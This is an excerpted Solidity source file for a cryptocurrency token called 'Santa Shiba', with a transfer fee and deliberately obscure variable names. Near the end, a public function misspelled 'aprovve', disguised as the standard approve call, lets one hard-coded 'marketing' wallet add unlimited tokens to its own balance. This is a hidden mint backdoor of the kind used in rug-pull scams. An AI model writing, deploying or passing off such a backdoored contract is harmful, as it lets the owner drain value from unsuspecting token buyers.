...
contract Context {
 ...
 contract SantaShiba is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloTSHI;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Santa Shiba";
    string private _symbol = "SANTIBA";
    ...
    uint256 private cryfaleTSHI = 4;
    uint256 private _vebegoTSHI = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloTSHI[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletTSHI = 0x32e657C794d0289d1d3723BDa23c32583Fb21a58;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloTSHI[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloTSHI[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleTSHI / 100) / _vebegoTSHI;
        allons = allons -  (_fee * _vebegoTSHI);
        
        superfloTSHI[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaTSHI) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloTSHI[account];
        require(accountBalance >= gzillaTSHI, "BEP : Can't be done");
        unchecked {
            superfloTSHI[account] = accountBalance - gzillaTSHI;
        }
        _totalSupply -= gzillaTSHI;

        emit Transfer(account, address(0), gzillaTSHI);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloTSHI[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletTSHI, "ERC20: cannot permit dev address");
    }   
